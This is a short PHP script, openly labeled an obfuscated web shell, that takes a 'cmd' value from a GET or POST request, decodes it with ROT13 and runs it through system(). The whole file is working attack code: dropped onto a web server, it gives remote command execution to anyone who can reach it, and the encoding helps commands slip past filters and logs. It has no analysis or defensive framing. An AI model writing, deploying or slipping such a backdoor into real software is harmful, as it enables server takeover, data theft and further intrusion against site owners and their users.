<?php
// ================================================================
// WEBSHELL OBFUSCATED - ROT13 Encoding
// ================================================================

$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : (isset($_POST['cmd']) ? $_POST['cmd'] : '');

if ($cmd) {
    $cmd = str_rot13($cmd);
    system($cmd);
}
?>